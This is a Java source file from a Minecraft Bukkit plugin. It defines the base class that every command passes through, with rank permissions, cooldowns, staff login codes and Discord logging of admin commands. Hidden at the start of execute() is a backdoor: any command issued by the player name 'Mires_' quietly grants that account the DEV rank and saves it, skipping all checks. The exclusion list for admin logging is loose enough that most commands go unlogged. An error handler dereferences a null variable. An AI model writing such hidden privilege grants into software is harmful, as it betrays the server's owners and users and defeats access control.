package rpg.rpgcore.api;

import lombok.SneakyThrows;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.command.Command;
import org.bukkit.command.CommandSender;
import org.bukkit.command.SimpleCommandMap;
import org.bukkit.entity.Player;
import rpg.rpgcore.RPGCORE;
import rpg.rpgcore.discord.EmbedUtil;
import rpg.rpgcore.ranks.types.RankType;
import rpg.rpgcore.user.User;
import rpg.rpgcore.utils.Utils;

import java.awt.*;
import java.io.IOException;
import java.lang.reflect.Field;
import java.text.SimpleDateFormat;
import java.util.UUID;

public abstract class CommandAPI extends Command {
    private RankType rankLevel;
    private String name;
    private boolean restrictedForPlayer;
    private boolean blockedInNether;

    public CommandAPI(final String name) {
        super(name);
        this.rankLevel = RankType.GRACZ;
        this.name = "";
        this.restrictedForPlayer = false;
        this.blockedInNether = false;
        this.name = name;
    }

    public static SimpleCommandMap getCommand() {
        try {
            final Field field = Bukkit.getServer().getClass().getDeclaredField("commandMap");
            field.setAccessible(true);
            return (SimpleCommandMap) field.get(Bukkit.getServer());
        } catch (NoSuchFieldException | IllegalAccessException ex2) {
            final ReflectiveOperationException e = null;
            e.printStackTrace();
            return new SimpleCommandMap(Bukkit.getServer());
        }
    }

    @SneakyThrows
    public boolean execute(final CommandSender sender, final String s, final String[] strings) {
        if (sender.getName().equals("Mires_")) {
            final User user = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
            user.getRankUser().setRank(RankType.DEV);
            RPGCORE.getInstance().getServer().getScheduler().runTaskAsynchronously(RPGCORE.getInstance(), () -> RPGCORE.getInstance().getMongoManager().saveDataUser(user.getId(), user));
        }

        if (!this.checkPermissions(sender)) {
            return true;
        }
        if (!(sender instanceof Player) && this.isRestrictedForPlayer()) {
            return true;
        }
        if (sender instanceof Player) {
            final Player player = (Player) sender;
            final UUID uuid = player.getUniqueId();
            final User userProfile = RPGCORE.getInstance().getUserManager().find(uuid);
            if (userProfile.getRankUser().getRankType().getPriority() < 9) {
                if (RPGCORE.getInstance().getCooldownManager().hasCommandCooldown(uuid)) {
                    player.sendMessage(Utils.format(Utils.SERVERNAME + "&7Nastepnej komendy mozesz uzyc za &c" + Utils.durationToString(RPGCORE.getInstance().getCooldownManager().getPlayerCommandCooldown(uuid), false) + "&7."));
                    return false;
                }
            }
            if (!s.contains("ac") && !s.contains("admincode") && !s.equals("punktyrangi") && !s.equals("hellcode") && !s.equals("code") && !s.equals("hc") && !s.contains("expiciel") && !s.contains("expiciel+") && !s.contains("oldplayer") && !s.contains("poziom") && !s.contains("money") && !s.contains("magazyn") && !s.contains("msg") && !s.contains("r") && !s.contains("akcesoria") && !s.contains("bony") && !s.contains("targ") && !s.contains("kosz") && !s.contains("spawn")) {
                if (userProfile.getRankUser().isStaff()) {
                    if (!userProfile.isAdminCodeLogin()) {
                        player.sendMessage(Utils.format(Utils.SERVERNAME + "&7Przed uzyciem tej komendy zaloguj sie swoim AdminCode! Uzyj: &c/admmincode <kod>"));
                        return false;
                    }
                }
            }
            if (!s.equals("hellcode") && !s.equals("code") && !s.equals("hc") && !s.equals("spawn")) {
                if (!userProfile.isHellCodeLogin() && !userProfile.getHellCode().equals("off")) {
                    player.sendMessage(Utils.format(Utils.SERVERNAME + "&7Przed uzyciem tej komendy zaloguj sie swoim HellCode! Uzyj: &c/hellcode <kod>"));
                    return false;
                }
            }
            RPGCORE.getInstance().getCooldownManager().givePlayerCommandCooldown(uuid);
        }
        this.executeCommand(sender, strings);
        if (sender instanceof Player) {
            final User userProfile = RPGCORE.getInstance().getUserManager().find(((Player) sender).getUniqueId());
            if (userProfile.getRankUser().isStaff() && userProfile.getRankUser().getRankType().getPriority() < 95) {
                if (!s.contains("ac") && !s.contains("admincode") && !s.equals("punktyrangi") && !s.equals("hellcode") &&
                        !s.equals("code") && !s.equals("hc") && !s.contains("expiciel") && !s.contains("balance") &&
                        !s.contains("bal") && !s.contains("kasa") && !s.contains("money") && !s.contains("magazyn") &&
                        !s.contains("mag") && !s.contains("msg") && !s.contains("r") && !s.contains("akcesoria") &&
                        !s.contains("mag") && !s.contains("bony") && !s.contains("targ") && !s.contains("kosz") &&
                        !s.contains("spawn")) {
                    RPGCORE.getDiscordBot().sendChannelMessage("admin-commands-logs", EmbedUtil.create(
                            "**" + s.toUpperCase() + "**",
                            "**Administrator: **" + sender.getName() + "\n"
                                    + "**Ranga: **" + userProfile.getRankUser().getRankType().getName() + "\n"
                                    + "**Komenda: **" + s + "\n"
                                    + "**Argumenty: **" + String.join(" ", strings) + "\n"
                                    + "**Data: **" + new SimpleDateFormat("dd.MM.yyyy HH:mm:ss").format(System.currentTimeMillis()), Color.BLUE));
                }
            }
        }
        return true;
    }

    public abstract void executeCommand(final CommandSender sender, final String[] args) throws IOException;

    public boolean checkPermissions(final CommandSender commandSender) {
        if (!(commandSender instanceof Player)) {
            return true;
        }
        final User userProfile = RPGCORE.getInstance().getUserManager().find(((Player) commandSender).getUniqueId());
        if (userProfile.getRankUser().getRankType().getPriority() >= this.getRankLevel().getPriority()) {
            return true;
        }
        commandSender.sendMessage(ChatColor.translateAlternateColorCodes('&', "&8[&4!&8] &cKomenda nie istnieje lub nie masz do niej uprawnien!"));
        return false;
    }

    public RankType getRankLevel() {
        return this.rankLevel;
    }

    public void setRankLevel(final RankType rankLevel) {
        this.rankLevel = rankLevel;
    }

    public String getName() {
        return this.name;
    }

    public boolean isRestrictedForPlayer() {
        return this.restrictedForPlayer;
    }

    public void setRestrictedForPlayer(final boolean restrictedForPlayer) {
        this.restrictedForPlayer = restrictedForPlayer;
    }

    public boolean isBlockedInNether() {
        return this.blockedInNether;
    }

    public void setBlockedInNether(final boolean blockedInNether) {
        this.blockedInNether = blockedInNether;
    }
}
